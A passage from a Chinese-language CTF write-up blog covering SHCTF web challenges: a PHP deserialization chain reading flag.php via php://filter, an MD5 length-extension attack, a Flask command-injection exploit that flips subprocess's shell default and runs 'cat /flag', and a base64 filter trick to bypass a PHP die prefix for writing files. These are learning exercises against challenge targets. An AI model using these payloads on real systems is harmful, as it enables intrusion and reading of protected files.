class="hljs-keyword">public</span> <span class="hljs-variable">$ding</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dong</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">milaoshu</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>;<br>&#125;<br><br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">musca</span>();<br><span class="hljs-variable">$poc</span>-&gt;ding = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">misca</span>();<br><span class="hljs-variable">$poc</span>-&gt;ding-&gt;fei = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">milaoshu</span>();<br><span class="hljs-variable">$poc</span>-&gt;ding-&gt;a = &amp;<span class="hljs-variable">$poc</span>-&gt;ding-&gt;gao;<br><span class="hljs-variable">$poc</span>-&gt;ding-&gt;fei-&gt;v = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$poc</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里我们看到上述采用了引用的点，这里是为了绕过misca对象中miaomiao函数对其a属性的值的改变。</p>
<p>剩下的还有绕过最开始的正则检测，这里当时我是直接修改前面的O:5为O:+5，这个其实是可以绕过的，不过很奇怪这道题打不通，后来思索了一番发现，用这种办法似乎会终止反序列化的进程。于是换了一种方法，只需要用array包围要序列化的变量即可。因为该正则就是检验序列化的字符串是否是对象字符串开头。–这里看了官方wp的解释是：+这种方式会受到PHP版本限制</p>
<p>最后就是传参问题了，这里需要以<code>wanna[fl.ag</code>这种方式传参，如下图解密即可得到flag</p>
<p class='item-img' data-src='image-20231031171756811.png'><img src="image-20231031171756811.png" alt="image-20231031171756811"></p>
<h3 id="WEEK2-MD5的事就拜托了"><a href="#WEEK2-MD5的事就拜托了" class="headerlink" title="WEEK2-MD5的事就拜托了"></a>[WEEK2]MD5的事就拜托了</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SHCTF&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SHCTF&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$$$scheme</span>===<span class="hljs-string">&#x27;SHCTF&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>));<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;length&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;length&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>*<span class="hljs-number">100</span>!=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>*<span class="hljs-number">100</span>))&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$flag</span>));<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SHCTF&#x27;</span>]!=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SHCTF&#x27;</span>]===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$num</span>)))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;flag is&quot;</span>.<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
<p>当时这道题也是很费脑子且没做出来。。。当时对于<code>$$$scheme</code>这一块儿走通了，但在最后的md5比较就不懂了，如今wp出来了，学习一波。</p>
<p>看了之后发现是考察md5补充攻击。。。没听说过，在此之前我们先拿到flag的md5值和长度再说。</p>
<p>这里关键就是<code>extract</code>与<code>parse_url</code>函数的配合了</p>
<p class='item-img' data-src='image-20231031172924081.png'><img src="image-20231031172924081.png" alt="image-20231031172924081"></p>
<p>这里认真看上面的代码我认为就可以理解了，这里extract函数就是将键名但最变量，键值当做变量的值而已，所以重点是理解parse_url函数，看题目要求我们$$$schema=指定字符串，<code>$num*100!=intval($num*100)</code>后面的我们用浮点类型即可绕过，而前面的payload如下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">SHCTF=host://SHCTF:password@user<br>length=1.1<br></code></pre></td></tr></table></figure>
<p>得到md5值和长度分别为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">8504ce3799001a7aecb62ec74d3835a5<br>42<br></code></pre></td></tr></table></figure>
<p>这里就先直接复现一波，后续原理的学习另起一篇文章，漏洞利用工具如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<p>下载zip安装相关依赖，直接运行py文件，根据提示输入内容</p>
<p class='item-img' data-src='image-20231031175753915.png'><img src="image-20231031175753915.png" alt="image-20231031175753915"></p>
<p>这里我是只输入hash和长度了，之后他给了我们新明文以及hash，我们分别给length和SHCTF赋值即可</p>
<p class='item-img' data-src='image-20231031175844738.png'><img src="image-20231031175844738.png" alt="image-20231031175844738"></p>
<p>拿到flag</p>
<h3 id="WEEK2-ez-rce"><a href="#WEEK2-ez-rce" class="headerlink" title="WEEK2-ez-rce"></a>[WEEK2]ez_rce</h3>
<p>暂时不会。。。</p>
<p>咳咳来补充了（靠官方wp</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><br>app = Flask(__name__)<br><br><span class="hljs-comment">#此函数用于遍历并从对象中提取属性。它接受一个对象（obj）和属性名称的列表（arg），然后返回最终属性。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gett</span>(<span class="hljs-params">obj,arg</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,i)<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment">#这个函数类似于gett，但用于设置一个具有指定值（num）的属性。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sett</span>(<span class="hljs-params">obj,arg,num</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arg)-<span class="hljs-number">1</span>):<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,arg[i])<br>    <span class="hljs-built_in">setattr</span>(tmp,arg[i+<span class="hljs-number">1</span>],num)<br><br><span class="hljs-comment">#它从subprocess中提取特定属性，将其转换为列表，使用给定的索引num和布尔值bol修改列表中的特定元素，然后将属性设置回修改后的列表。 </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>(<span class="hljs-params">giveme,num,bol</span>):<br>    c = gett(subprocess,giveme)<br>    tmp = <span class="hljs-built_in">list</span>(c)<br>    tmp[num] = bol<br>    tmp = <span class="hljs-built_in">tuple</span>(tmp)<br>    sett(subprocess,giveme,tmp)<br><br>    <span class="hljs-comment">#这个函数用于使用subprocess.call方法执行Shell命令。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">arg</span>):<br>    subprocess.call(arg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;exec&#x27;</span>)==<span class="hljs-string">&#x27;ok&#x27;</span>:<br>            shell = request.args.get(<span class="hljs-string">&#x27;shell&#x27;</span>)<br>            cmd(shell)<br>        <span class="hljs-keyword">else</span>:<br>            exp = <span class="hljs-built_in">list</span>(request.get_json()[<span class="hljs-string">&#x27;exp&#x27;</span>])<br>            num = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;num&#x27;</span>))<br>            bol = <span class="hljs-built_in">bool</span>(request.args.get(<span class="hljs-string">&#x27;bol&#x27;</span>))<br>            hint(exp,num,bol)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure>
<p>附件给了我们源码，这里配合GPT做了一波审计，下面附上关键函数的用法截图：</p>
<p class='item-img' data-src='image-20231103195044902.png'><img src="image-20231103195044902.png" alt="image-20231103195044902"></p>
<p>这里分析了一波，我们来搞一下思路，这里的代码可以实现修改subprocess函数的某些属性，如果我们传入恶意数据就可以修改我们想要的属性的值了。</p>
<p>这里我们可以json传入数据，也就是传入subprocess函数的某些参数，随后num定位我们想要修改的参数位置，bol是修改参数的布尔值，这样传入之后可以通过gett，sett函数的配合，将参数的布尔值修改为我们想要的布尔值。–这里也是通过wp学到了一些审计代码的小知识吧。我们将代码通过pycharm打开来搜索一些代码</p>
<p class='item-img' data-src='image-20231103195829002.png'><img src="image-20231103195829002.png" alt="image-20231103195829002"></p>
<p>如上图我们看到敏感函数call，我们跟踪看一下</p>
<p class='item-img' data-src='image-20231103195857003.png'><img src="image-20231103195857003.png" alt="image-20231103195857003"></p>
<p>我们看到这里接受三个参数，但实际有执行功能的似乎是popen，我们继续跟踪看一下</p>
<p class='item-img' data-src='image-20231103195931464.png'><img src="image-20231103195931464.png" alt="image-20231103195931464"></p>
<p>我们看到其init属性中存在诸多参数，其中有shell的默认值为false，我们看一下官方的提示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Subprocess.call函数有一个参数shell，当shell为True时，执行命令时是/bin/sh -c “$cmd”这样的，可以进行命令注入。而当shell为false时，执行命令时是/bin/cmd arg这种。而这个方法的shell参数默认为false。<br></code></pre></td></tr></table></figure>
<p>因此我们要令shell为true才可以，这里就是想办法修改其布尔值了</p>
<p>根据函数的默认参数保存在defaults属性中，我们在终端看一下其位置</p>
<p class='item-img' data-src='image-20231103201618954.png'><img src="image-20231103201618954.png" alt="image-20231103201618954"></p>
<p>如上图可以看到位置在第八个，也就是下标为7，我们给num赋值为7即可</p>
<p>我们构造如下payload，注：json格式，bol为字符串，exp的格式为数组（用来被gett遍历）</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>		<span class="hljs-string">&quot;Popen&quot;</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">&quot;__init__&quot;</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">&quot;__default__&quot;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br>get传参：?num=<span class="hljs-number">7</span>&amp;bol=<span class="hljs-literal"><span class="hljs-keyword">true</span></span>&amp;shell=mkdir%<span class="hljs-number">20.</span>/static;cat%<span class="hljs-number">20</span>/flag&gt;./static/<span class="hljs-number">1.</span>txt&amp;exec=oka<br></code></pre></td></tr></table></figure>
<p>接下来令exec不为ok即可进入else语句–这里注意content-type的内容</p>
<p class='item-img' data-src='image-20231103203437201.png'><img src="image-20231103203437201.png" alt="image-20231103203437201"></p>
<p>下面要get传参，令exec=ok进入cmd命令执行状态</p>
<p class='item-img' data-src='image-20231103203755216.png'><img src="image-20231103203755216.png" alt="image-20231103203755216"></p>
<p>拿到flag</p>
<p class='item-img' data-src='image-20231103203810165.png'><img src="image-20231103203810165.png" alt="image-20231103203810165"></p>
<h3 id="WEEK3-快问快答"><a href="#WEEK3-快问快答" class="headerlink" title="WEEK3-快问快答"></a>[WEEK3]快问快答</h3>
<p class='item-img' data-src='image-20231031181934913.png'><img src="image-20231031181934913.png" alt="image-20231031181934913"></p>
<p>直接看题目源码，很明显是要写脚本的，由于本人太菜，所以就跟着别的佬去写了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_answer</span>(<span class="hljs-params">url, headers, answer, cookie</span>):<span class="hljs-comment">#发送请求</span><br>   answer1 = &#123;<span class="hljs-string">&#x27;answer&#x27;</span>: answer&#125;<br>   response=requests.Session()<br>   response = response.post(url, headers=headers, data=answer1,cookies=cookie)<span class="hljs-comment">#这个需要设cookie，因为每道题的cookie都是不同的</span><br>   <span class="hljs-keyword">return</span> response<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_question</span>(<span class="hljs-params">response</span>):<span class="hljs-comment">#用于计算答案</span><br>   html = response.text<br>   answer=<span class="hljs-number">0</span><br>   pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;h3&gt;(.*?)&lt;/h3&gt;&quot;</span>)<span class="hljs-comment">#(.*?)：这是正则表达式的一部分，用于捕获任何字符（除了换行符 \n）零次或多次，非贪婪地匹配，其中的r是为了让其中的反斜杠字符视为普通字符</span><br>   <span class="hljs-keyword">match</span> = pattern.search(html)<br>   <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>       question = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>       numbers = re.findall(<span class="hljs-string">r&quot;\d+&quot;</span>, question)<br>       operation = re.findall(<span class="hljs-string">r&#x27;异或|与|\+|-|x|÷&#x27;</span>, question)<span class="hljs-comment">#识别运算符</span><br>       op=operation[<span class="hljs-number">0</span>]<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(numbers) == <span class="hljs-number">2</span>:<br>           a = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">0</span>])<br>           b = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">1</span>])<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">&quot;异或&quot;</span>:<br>               answer = a ^ b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">&quot;与&quot;</span>:<br>               answer = a &amp; b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">&quot;-&quot;</span>:<br>               answer = a - b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">&quot;+&quot;</span>:<br>               answer = a + b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">&quot;x&quot;</span>:<br>               answer = a * b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">&quot;÷&quot;</span>:<br>               answer = <span class="hljs-built_in">int</span>(a/b)<span class="hljs-comment">#这里要特别注意要强转成整形，因为题目只能提交整数，如果不转，脚本运行的时候，会因为提交无效数据而爆500的错误</span><br>           <span class="hljs-comment">#print(question)</span><br>           <span class="hljs-comment">#print(answer)</span><br>   <span class="hljs-keyword">else</span>:<br>           <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;找不到题目&quot;</span>)<br>   <span class="hljs-keyword">return</span> answer<br> <br>url = <span class="hljs-string">&quot;http://112.6.51.212:32776/&quot;</span>  <span class="hljs-comment"># 这里替换为你要访问的网址</span><br>headers = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;<br>cookie=<span class="hljs-number">0</span><br>answer = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">52</span>):<span class="hljs-comment">#这里要设置成52，相当于循环了51次，因为第一次是初始化，答案是错的</span><br>       time.sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">#这里是为了别让程序答得太快，因为题目答题速度是1到2秒之间</span><br>       response = post_answer(url, headers, answer, cookie)<br>       <span class="hljs-built_in">print</span>(response.text)<span class="hljs-comment">#打印表单</span><br>       answer = parse_question(response)<br>       cookie = response.cookies<br></code></pre></td></tr></table></figure>
<p>拿到flag，感觉这个脚本还是有难度的。。。。我先练习一波</p>
<p class='item-img' data-src='image-20231031183614448.png'><img src="image-20231031183614448.png" alt="image-20231031183614448"></p>
<p>之后又研究了一波代码，发现<code>match.group(1)</code>此处是必须为1的，如果为0输出如下：很明显会导致我们后续对数字的判断错误</p>
<p class='item-img' data-src='image-20231031190928323.png'><img src="image-20231031190928323.png" alt="image-20231031190928323"></p>
<h3 id="WEEK3-sseerriiaalliizzee"><a href="#WEEK3-sseerriiaalliizzee" class="headerlink" title="WEEK3-sseerriiaalliizzee"></a>[WEEK3]sseerriiaalliizzee</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;barking-&gt;<span class="hljs-title function_ invoke__">dosomething</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$part1</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$part2</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; part1 = <span class="hljs-variable">$part1</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; part2 = <span class="hljs-variable">$part2</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$useless</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$useful</span>= <span class="hljs-variable">$useless</span>. <span class="hljs-variable language_">$this</span>-&gt;part2;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; part1,<span class="hljs-variable">$useful</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./flag,php&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;barking for fun!&quot;</span>;<br>        <br>    &#125;<br>&#125;<br><br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$code</span>))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no way, fuck off&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br>no way, fuck off <br></code></pre></td></tr></table></figure>
<p>这道题目链子很容易分析，tostring魔术方法的调用在echo 反序列化处就会调用的，难点是利用点在CTF类中的<code>$useful= $useless. $this-&gt;part2;</code>处，但我们可以看到他之前是有一个内容为php代码，其中含有die，这会导致程序的直接退出。此时让我想到了PHP的死亡die绕过，记得p神讲过的：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a>–我只能说讲得真通俗易懂，这里截取关键部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">幸运的是，这里的$_POST[&#x27;filename&#x27;]是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。<br><br>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。<br><br>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br><span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure>
<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，&quot;phpexita&quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
<p>根据上述理论我们看一下<code>&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;</code>在经过base64解码的时候会将<code>&lt;、?、;、(、)</code>忽略，也就是说最后只剩下<code>phpdie+GenshinImpactStart+</code>共26个字符，考虑到base64特性我们需要增添两个字符使其为4的倍数也就是28，最终payload如下：</p>
